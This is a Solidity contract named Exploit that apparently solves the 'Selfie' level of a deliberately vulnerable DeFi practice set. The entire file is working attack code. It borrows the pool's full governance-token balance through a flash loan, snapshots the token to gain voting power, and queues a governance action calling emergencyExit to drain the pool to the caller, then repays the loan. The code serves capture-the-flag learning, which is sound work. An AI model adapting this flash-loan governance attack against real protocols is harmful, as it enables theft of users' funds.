// SPDX-License-Identifier: MIT 
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Exploit is IERC3156FlashBorrower {
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private governanceToken;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _selfiePool, address _simpleGovernance, address _governanceToken) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        selfiePool.flashLoan(this, address(governanceToken), governanceToken.balanceOf(address(selfiePool)), data);
    }    

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        governanceToken.snapshot();
        simpleGovernance.queueAction(address(selfiePool), 0, data);
        governanceToken.approve(address(selfiePool), amount);
        return CALLBACK_SUCCESS;
    }
}